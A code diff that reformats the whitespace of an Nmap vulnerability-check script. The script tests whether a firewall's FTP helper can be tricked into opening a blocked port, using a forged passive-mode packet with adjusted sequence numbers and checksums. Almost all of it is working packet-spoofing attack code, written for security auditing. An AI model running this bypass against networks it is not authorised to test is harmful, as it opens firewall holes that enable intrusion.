@@ -43,234 +43,234 @@ license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
 categories = {"vuln", "intrusive"}
 
 ftp_helper = {
-    should_run = function(host, helperport)
-        local helperport = helperport or 21
-        -- IPv4 and IPv6 are supported
-        if nmap.address_family() ~= 'inet' and nmap.address_family() ~= 'inet6' then
-            return false
+  should_run = function(host, helperport)
+    local helperport = helperport or 21
+    -- IPv4 and IPv6 are supported
+    if nmap.address_family() ~= 'inet' and nmap.address_family() ~= 'inet6' then
+      return false
+    end
+
+    -- Test if helper port is open
+    local testsock = nmap.new_socket()
+    testsock:set_timeout(1000)
+    local status, _ = testsock:connect(host.ip, helperport)
+    testsock:close()
+    if not status then
+      stdnse.print_debug("%s Unable to connect to %s helper port.", SCRIPT_NAME, helperport)
+      return false
+    end
+    return true
+  end,
+
+  attack = function(host, helperport, targetport)
+    local ethertype, payload
+    local isIp4 = nmap.address_family() == 'inet' -- True if we are using IPv4. Otherwise, it is IPv6
+
+    if isIp4 then
+      -- IPv4 payload
+      payload = "227 Entering Passive Mode (" ..
+      string.gsub(host.ip,"%.",",") .. "," ..
+      bit.band(bit.rshift(targetport, 8), 0xff) ..
+      "," .. bit.band(targetport, 0xff) ..
+      ")\r\n"
+      ethertype = string.char(0x08, 0x00) -- Ethernet Type: IPv4
+
+    else
+      -- IPv6 payload
+      payload = "229 Extended Passive Mode OK (|||" .. targetport .. "|)\r\n"
+      ethertype = string.char(0x86, 0xdd) -- Ethernet Type: IPv6
+    end
+
+    helperport = helperport or 21
+    local function spoof_ftp_packet(host, helperport, targetport)
+      -- Sniffs the network for src host host.ip and src port helperport
+      local filter = "src host " .. host.ip .. " and tcp src port " .. helperport
+      local status, l2data, l3data
+      local timeout = 1000
+      local start = nmap.clock_ms()
+
+      -- Start sniffing
+      local sniffer = nmap.new_socket()
+      sniffer:set_timeout(100)
+      sniffer:pcap_open(host.interface, 256, true, filter)
+
+      -- Until we get adequate packet
+      while (nmap.clock_ms() - start) < timeout do
+        local _
+        status, _, l2data, l3data = sniffer:pcap_receive()
+        if status and string.find(l3data, "220 ") then
+          break
         end
+      end
 
-        -- Test if helper port is open
-        local testsock = nmap.new_socket()
-        testsock:set_timeout(1000)
-        local status, _ = testsock:connect(host.ip, helperport)
-        testsock:close()
-        if not status then
-            stdnse.print_debug("%s Unable to connect to %s helper port.", SCRIPT_NAME, helperport)
-            return false
+      -- Get ethernet values
+      local f = packet.Frame:new(l2data)
+      f:ether_parse()
+
+      local p = packet.Packet:new(l3data, #l3data)
+      if isIp4 then
+        if not p:ip_parse() then
+          -- An error happened
+          stdnse.print_debug("%s Couldn't parse IPv4 sniffed packet.", SCRIPT_NAME)
+          sniffer:pcap_close()
+          return false
         end
-        return true
-    end,
-
-    attack = function(host, helperport, targetport)
-	local ethertype, payload
-	local isIp4 = nmap.address_family() == 'inet' -- True if we are using IPv4. Otherwise, it is IPv6
-
-	if isIp4 then
-	    -- IPv4 payload
-            payload = "227 Entering Passive Mode (" ..
-                      string.gsub(host.ip,"%.",",") .. "," ..
-                      bit.band(bit.rshift(targetport, 8), 0xff) ..
-                      "," .. bit.band(targetport, 0xff) ..
-                      ")\r\n"
-	    ethertype = string.char(0x08, 0x00) -- Ethernet Type: IPv4
-
-	else
-	    -- IPv6 payload
-	    payload = "229 Extended Passive Mode OK (|||" .. targetport .. "|)\r\n"
-	    ethertype = string.char(0x86, 0xdd) -- Ethernet Type: IPv6
-	end
-
-        helperport = helperport or 21
-        local function spoof_ftp_packet(host, helperport, targetport)
-            -- Sniffs the network for src host host.ip and src port helperport
-            local filter = "src host " .. host.ip .. " and tcp src port " .. helperport
-            local status, l2data, l3data
-            local timeout = 1000
-            local start = nmap.clock_ms()
-
-            -- Start sniffing
-            local sniffer = nmap.new_socket()
-            sniffer:set_timeout(100)
-            sniffer:pcap_open(host.interface, 256, true, filter)
-
-	    -- Until we get adequate packet
-            while (nmap.clock_ms() - start) < timeout do
-                local _
-                status, _, l2data, l3data = sniffer:pcap_receive()
-                if status and string.find(l3data, "220 ") then
-                    break
-                end
-            end
-
-            -- Get ethernet values
-            local f = packet.Frame:new(l2data)
-            f:ether_parse()
-
-            local p = packet.Packet:new(l3data, #l3data)
-	    if isIp4 then
-		if not p:ip_parse() then
-		    -- An error happened
-		    stdnse.print_debug("%s Couldn't parse IPv4 sniffed packet.", SCRIPT_NAME)
-		    sniffer:pcap_close()
-		    return false
-		end
-	    else
-		if not p:ip6_parse() then
-		    -- An error happened
-		    stdnse.print_debug("%s Couldn't parse IPv6 sniffed packet.", SCRIPT_NAME)
-		    sniffer:pcap_close()
-		    return false
-		end
-	    end
-
-            -- Spoof packet
-            -- 1. Invert ethernet addresses
-            f.frame_buf = f.mac_src .. f.mac_dst .. ethertype
-
-            -- 2. Modify packet payload
-            p.buf = string.sub(p.buf, 1, p.tcp_data_offset) ..  payload
-            -- 3. Increment IP ID field (IPv4 packets)
-	    if isIp4 then
-		p:ip_set_id(p.ip_id + 1)
-	    end
-
-            -- 4. Set TCP sequence number correctly using traffic data
-            p:tcp_set_seq(p.tcp_seq + p.tcp_data_length)
-
-            -- 5. Update all checksums and lengths
-	    if isIp4 then
-		-- Packet length field
-		p:ip_set_len(#p.buf)
-		p:ip_count_checksum()
-	    else
-		-- Payload length field
-		p:ip6_set_plen(#p.buf - p.tcp_offset)
-	    end
-	    p:tcp_count_checksum()
-
-            -- and finally, we send it.
-            local dnet = nmap.new_dnet()
-            dnet:ethernet_open(host.interface)
-            dnet:ethernet_send(f.frame_buf .. p.buf)
-            status = sniffer:pcap_receive()
-            dnet:ethernet_close()
-            return true
+      else
+        if not p:ip6_parse() then
+          -- An error happened
+          stdnse.print_debug("%s Couldn't parse IPv6 sniffed packet.", SCRIPT_NAME)
+          sniffer:pcap_close()
+          return false
         end
+      end
 
-        local co = stdnse.new_thread(spoof_ftp_packet, host, helperport, targetport)
+      -- Spoof packet
+      -- 1. Invert ethernet addresses
+      f.frame_buf = f.mac_src .. f.mac_dst .. ethertype
 
-        -- Wait for packet spoofing thread
-        stdnse.sleep(1)
-        -- Make connection to the target while packet the spoofing thread is sniffing for packets
-        local socket = nmap.new_socket()
-        socket:set_timeout(3000)
-        local status, _ = socket:connect(host.ip, helperport)
-        if not status then
-            -- Problem connecting to helper port
-            stdnse.print_debug("%s Problem connecting to helper port %s.", SCRIPT_NAME, tostring(helperport))
-            return
-        end
+      -- 2. Modify packet payload
+      p.buf = string.sub(p.buf, 1, p.tcp_data_offset) ..  payload
+      -- 3. Increment IP ID field (IPv4 packets)
+      if isIp4 then
+        p:ip_set_id(p.ip_id + 1)
+      end
 
-        -- wait packet spoofing thread to finish
-        stdnse.sleep(1.5)
-        socket:close()
-        return
-    end,
+      -- 4. Set TCP sequence number correctly using traffic data
+      p:tcp_set_seq(p.tcp_seq + p.tcp_data_length)
+
+      -- 5. Update all checksums and lengths
+      if isIp4 then
+        -- Packet length field
+        p:ip_set_len(#p.buf)
+        p:ip_count_checksum()
+      else
+        -- Payload length field
+        p:ip6_set_plen(#p.buf - p.tcp_offset)
+      end
+      p:tcp_count_checksum()
+
+      -- and finally, we send it.
+      local dnet = nmap.new_dnet()
+      dnet:ethernet_open(host.interface)
+      dnet:ethernet_send(f.frame_buf .. p.buf)
+      status = sniffer:pcap_receive()
+      dnet:ethernet_close()
+      return true
+    end
+
+    local co = stdnse.new_thread(spoof_ftp_packet, host, helperport, targetport)
+
+    -- Wait for packet spoofing thread
+    stdnse.sleep(1)
+    -- Make connection to the target while packet the spoofing thread is sniffing for packets
+    local socket = nmap.new_socket()
+    socket:set_timeout(3000)
+    local status, _ = socket:connect(host.ip, helperport)
+    if not status then
+      -- Problem connecting to helper port
+      stdnse.print_debug("%s Problem connecting to helper port %s.", SCRIPT_NAME, tostring(helperport))
+      return
+    end
+
+    -- wait packet spoofing thread to finish
+    stdnse.sleep(1.5)
+    socket:close()
+    return
+  end,
 }
 
 -- List of helpers
 local helpers = {
-    ftp = ftp_helper, -- FTP (IPv4 and IPv6)
+  ftp = ftp_helper, -- FTP (IPv4 and IPv6)
 }
 
 local helper
 
 hostrule = function(host)
-    helper = stdnse.get_script_args(SCRIPT_NAME .. ".helper")
+  helper = stdnse.get_script_args(SCRIPT_NAME .. ".helper")
 
-    if not nmap.is_privileged() then
-        nmap.registry[SCRIPT_NAME] = nmap.registry[SCRIPT_NAME] or {}
-        if not nmap.registry[SCRIPT_NAME].rootfail then
-            stdnse.print_verbose("%s lacks privileges.", SCRIPT_NAME )
-            nmap.registry[SCRIPT_NAME].rootfail = true
-        end
-        return false
+  if not nmap.is_privileged() then
+    nmap.registry[SCRIPT_NAME] = nmap.registry[SCRIPT_NAME] or {}
+    if not nmap.registry[SCRIPT_NAME].rootfail then
+      stdnse.print_verbose("%s lacks privileges.", SCRIPT_NAME )
+      nmap.registry[SCRIPT_NAME].rootfail = true
     end
+    return false
+  end
 
-    if not host.interface then
-        return false
-    end
+  if not host.interface then
+    return false
+  end
 
-    if helper and not helpers[helper] then
-        stdnse.print_debug("%s %s helper not supported at the moment.", SCRIPT_NAME, helper)
-        return false
-    end
+  if helper and not helpers[helper] then
+    stdnse.print_debug("%s %s helper not supported at the moment.", SCRIPT_NAME, helper)
+    return false
+  end
 
-    return true
+  return true
 end
 
 action = function(host, port)
-    local helperport = tonumber(stdnse.get_script_args(SCRIPT_NAME .. ".helperport"))
-    local targetport = tonumber(stdnse.get_script_args(SCRIPT_NAME .. ".targetport"))
-    local helpername
+  local helperport = tonumber(stdnse.get_script_args(SCRIPT_NAME .. ".helperport"))
+  local targetport = tonumber(stdnse.get_script_args(SCRIPT_NAME .. ".targetport"))
+  local helpername
 
-    if targetport then
-        -- We should check if target port is not already open
-        local testsock = nmap.new_socket()
-        testsock:set_timeout(1000)
-        local status, _ = testsock:connect(host.ip, targetport)
-        if status then
-            stdnse.print_debug("%s %s target port already open.", SCRIPT_NAME, targetport)
-            return nil
-        end
-        testsock:close()
-    else
-        -- If not target port specified, we try to get a filtered port,
-	-- which would be more likely blocked by a firewall before looking for a closed one.
-        local port = nmap.get_ports(host, nil, "tcp", "filtered") or nmap.get_ports(host, nil, "tcp", "closed")
-        if port then
-            targetport = port.number
-            stdnse.print_debug("%s %s chosen as target port.", SCRIPT_NAME, targetport)
-        else
-            -- No closed or filtered ports to check on.
-            stdnse.print_debug("%s Target port not specified and no closed or filtered port found.", SCRIPT_NAME)
-            return
-        end
-    end
-    -- If helper chosen by user
-    if helper then
-        if helpers[helper].should_run(host, helperport) then
-            helpers[helper].attack(host, helperport, targetport)
-        else
-            return
-        end
-    -- If no helper chosen manually, we iterate over table to find a suitable one.
-    else
-        for i, helper in pairs(helpers) do
-            if helper.should_run(host, helperport) then
-                helpername = i
-                stdnse.print_debug("%s %s chosen as helper.", SCRIPT_NAME, helpername)
-                helper.attack(host, helperport, targetport)
-                break
-            end
-        end
-        if not helpername then
-            stdnse.print_debug("%s no suitable helper found.", SCRIPT_NAME)
-            return nil
-        end
-    end
-
-    -- Then we check if target port is now open.
+  if targetport then
+    -- We should check if target port is not already open
     local testsock = nmap.new_socket()
     testsock:set_timeout(1000)
     local status, _ = testsock:connect(host.ip, targetport)
-    testsock:close()
     if status then
-        -- If we could connect, then port is open and firewall is vulnerable.
-        local vulnstring = "Firewall vulnerable to bypass through " .. (helper or helpername) .. " helper. "
-			    .. (nmap.address_family() == 'inet' and "(IPv4)" or "(IPv6)")
-
-        return stdnse.format_output(true, vulnstring)
+      stdnse.print_debug("%s %s target port already open.", SCRIPT_NAME, targetport)
+      return nil
     end
+    testsock:close()
+  else
+    -- If not target port specified, we try to get a filtered port,
+    -- which would be more likely blocked by a firewall before looking for a closed one.
+    local port = nmap.get_ports(host, nil, "tcp", "filtered") or nmap.get_ports(host, nil, "tcp", "closed")
+    if port then
+      targetport = port.number
+      stdnse.print_debug("%s %s chosen as target port.", SCRIPT_NAME, targetport)
+    else
+      -- No closed or filtered ports to check on.
+      stdnse.print_debug("%s Target port not specified and no closed or filtered port found.", SCRIPT_NAME)
+      return
+    end
+  end
+  -- If helper chosen by user
+  if helper then
+    if helpers[helper].should_run(host, helperport) then
+      helpers[helper].attack(host, helperport, targetport)
+    else
+      return
+    end
+    -- If no helper chosen manually, we iterate over table to find a suitable one.
+  else
+    for i, helper in pairs(helpers) do
+      if helper.should_run(host, helperport) then
+        helpername = i
+        stdnse.print_debug("%s %s chosen as helper.", SCRIPT_NAME, helpername)
+        helper.attack(host, helperport, targetport)
+        break
+      end
+    end
+    if not helpername then
+      stdnse.print_debug("%s no suitable helper found.", SCRIPT_NAME)
+      return nil
+    end
+  end
+
+  -- Then we check if target port is now open.
+  local testsock = nmap.new_socket()
+  testsock:set_timeout(1000)
+  local status, _ = testsock:connect(host.ip, targetport)
+  testsock:close()
+  if status then
+    -- If we could connect, then port is open and firewall is vulnerable.
+    local vulnstring = "Firewall vulnerable to bypass through " .. (helper or helpername) .. " helper. "
+    .. (nmap.address_family() == 'inet' and "(IPv4)" or "(IPv6)")
+
+    return stdnse.format_output(true, vulnstring)
+  end
 end
